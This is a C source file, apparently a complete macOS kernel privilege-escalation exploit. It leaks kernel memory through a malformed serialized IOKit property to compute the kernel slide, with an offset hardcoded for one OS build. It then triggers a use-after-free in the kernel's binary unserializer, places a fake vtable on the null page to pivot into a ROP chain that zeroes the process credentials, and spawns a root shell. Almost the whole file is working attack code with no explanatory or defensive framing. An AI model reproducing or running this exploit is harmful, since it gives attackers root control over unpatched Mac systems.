//#include <stdio.h>
//#include <stdlib.h>
//#include <mach/mach.h>
//#include <IOKit/IOKitLib.h>

//#include "lsym.h"
//#include "lsym_gadgets.h"
#include "import.h"

#include <signal.h>

enum 
{
    kOSSerializeDictionary   = 0x01000000U,
    kOSSerializeArray        = 0x02000000U,
    kOSSerializeSet          = 0x03000000U,
    kOSSerializeNumber       = 0x04000000U,
    kOSSerializeSymbol       = 0x08000000U,
    kOSSerializeString       = 0x09000000U,
    kOSSerializeData         = 0x0a000000U,
    kOSSerializeBoolean      = 0x0b000000U,
    kOSSerializeObject       = 0x0c000000U,
    kOSSerializeTypeMask     = 0x7F000000U,
    kOSSerializeDataMask     = 0x00FFFFFFU,
    kOSSerializeEndCollecton = 0x80000000U,
};

#define kOSSerializeBinarySignature 0x000000d3 //"\323\0\0"

#define SHIFT 0x200

uint32_t kslide = 0;

__attribute__((always_inline)) inline
lsym_slidden_kern_pointer_t lsym_slide_pointer(lsym_kern_pointer_t pointer) {
    if (!pointer) return pointer;
    return (lsym_slidden_kern_pointer_t) pointer + kslide;
}

uint32_t infoleak()
{
    kern_return_t kr = 0, err = 0;
    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;
    io_service_t serv = 0;
    io_connect_t conn = 0;
    io_iterator_t iter = 0;

    uint32_t *obj = calloc(1, 128);
    int ctr = 0;

    obj[ctr++] = kOSSerializeBinarySignature;
    obj[ctr++] = kOSSerializeDictionary | kOSSerializeEndCollecton | 1;
    obj[ctr++] = kOSSerializeSymbol | 4;
    obj[ctr++] = 0x006f6f66; // "foo"
    obj[ctr++] = kOSSerializeNumber | kOSSerializeEndCollecton | SHIFT;
    obj[ctr++] = 0x41414141;
    obj[ctr++] = 0x42424242;

    printf("[.] Constructed dict\n");
    for (int i = 0; i < ctr; ++i)
        printf("    0x%08x\n", obj[i]);

    host_get_io_master(mach_host_self(), &master);

    serv = IOServiceGetMatchingService(master, IOServiceMatching("IOHDIXController"));

    kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)obj, ctr * sizeof(uint32_t), &err, &conn);
    if (kr != KERN_SUCCESS) 
    {
        printf("ERROR: UC creation failed\n");
        return -1;
    }
    printf("[.] UC created\n");

    IORegistryEntryCreateIterator(serv, "IOService", kIORegistryIterateRecursively, &iter);
    io_object_t object = IOIteratorNext(iter);

    char pid_str[32] = {0};

    char buf[64] = {0};
    mach_msg_type_number_t dataCnt = SHIFT;
    bool leaked = 0;

    while (object)
    {
        char tmp[64] = {0};
        uint32_t size = sizeof(tmp);
        if (IORegistryEntryGetProperty(object, "IOUserClientCreator", tmp, &size) == KERN_SUCCESS)
        {
            if (strstr(tmp, pid_str))
            {
                kr = IORegistryEntryGetProperty(object, "foo", (char *)&buf, &dataCnt);
                if (kr == KERN_SUCCESS)
                    leaked = 1;
                else
                    printf("ERROR: get proptery fail\n");
                break;
            }
        }
        IOObjectRelease(object);
        object = IOIteratorNext(iter);
    }
    if (!leaked)
    {
        printf("ERROR: couldn't find UC. wtf??\n");
        return -1;
    }
    printf("[.] leaked data:\n");

    for (int i = 0; i < 8; ++i)
        printf("    %#llx\n", *(uint64_t *)(buf + sizeof(uint64_t) * i));

    // XXX hardcoded 10.11.2 (15C50)
    uint64_t kslide = *(uint64_t *)(buf + sizeof(uint64_t) * 7) - 0xffffff80003962cf;
    printf("[+] Calculated kslide: %#llx\n", kslide);

    return kslide;
}

void uaf()
{
    kern_return_t kr = 0;
    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;

    uint32_t *obj = calloc(1, 128);
    int ctr = 0;

    obj[ctr++] = kOSSerializeBinarySignature;
    obj[ctr++] = kOSSerializeDictionary | kOSSerializeEndCollecton | 3;
    obj[ctr++] = kOSSerializeString | 4; // entry 1
    obj[ctr++] = 0x00414141;
    obj[ctr++] = kOSSerializeBoolean | 1;
    obj[ctr++] = kOSSerializeSymbol | 4; // entry 2
    obj[ctr++] = 0x00424242;
    obj[ctr++] = kOSSerializeData | 32;
    obj[ctr++] = 0x00000000;
    obj[ctr++] = 0x00000000;
    obj[ctr++] = 0x22222222;
    obj[ctr++] = 0x33333333;
    obj[ctr++] = 0x44444444;
    obj[ctr++] = 0x55555555;
    obj[ctr++] = 0x66666666;
    obj[ctr++] = 0x77777777;
    obj[ctr++] = kOSSerializeSymbol | 4; // entry 3 reference to entry 1
    obj[ctr++] = 0x00434343;
    obj[ctr++] = kOSSerializeObject | kOSSerializeEndCollecton | 1;

    printf("[.] Constructed dict\n");
    for (int i = 0; i < ctr; ++i)
        printf("    0x%08x\n", obj[i]);

    lsym_map_t *kmap = lsym_map_file("/System/Library/Kernels/kernel");

    printf("[.] Constructing ROP chain...\n");
    kernel_fake_stack_t *stack = calloc(1, sizeof(kernel_fake_stack_t));

    PUSH_GADGET(stack) = RESOLVE_SYMBOL(kmap, "_current_proc");
    PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack, kmap);
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(kmap, "_proc_ucred");
    PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack, kmap);
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(kmap, "_posix_cred_get");
    PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack, kmap);
    PUSH_GADGET(stack) = ROP_ARG2(stack, kmap, sizeof(int)*3)
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(kmap, "_bzero");

    PUSH_GADGET(stack) = RESOLVE_SYMBOL(kmap, "_thread_exception_return"); // return from kernel space

    mach_vm_address_t null_page = 0;
    mach_vm_deallocate(mach_task_self(), null_page, 0x1000);
    kr = mach_vm_allocate(mach_task_self(), &null_page, 0x1000, 0);
    if (kr != KERN_SUCCESS)
    {
        printf("ERROR: null page allocation failed.\n");
        return;
    }

    uint64_t *vtable = (uint64_t *)null_page;
    /*
    vtable[0] = 0;
    vtable[1] = 0;
    vtable[2] = 0;
    vtable[3] = ROP_POP_RAX(kmap);
    vtable[4] = ROP_PIVOT_RAX(kmap);
    vtable[5] = ROP_POP_RAX(kmap);
    vtable[6] = 0;
    vtable[7] = ROP_POP_RSP(kmap);
    vtable[8] = (uint64_t)stack->__rop_chain;
    */
    vtable[0] = ROP_POP_RSP(kmap); // call rop chain
    vtable[1] = (uint64_t)stack->__rop_chain;;
    vtable[2] = 0;
    vtable[3] = 0;
    vtable[4] = ROP_XCHG_RSP_EAX(kmap); // stack pivot
    /*
    printf("vtable\n");
    for (int i = 0; i < 10; ++i)
        printf("    %#llx\n", vtable[i]);
    */

    // trigger
    printf("[+] Triggering UaF\n");
    host_get_io_master(mach_host_self(), &master);

    io_service_get_matching_services_bin(master, (char *)obj, ctr * sizeof(uint32_t), &res);
}

int main()
{
    //raise(SIGSTOP);

    kslide = infoleak();

    uaf();

    if (!getuid())
    {
        printf("\nwe root\n\n");
        char *shell[] = {"/bin/sh", 0};
        execve(shell[0], shell, 0);
    }

    return 0;
}
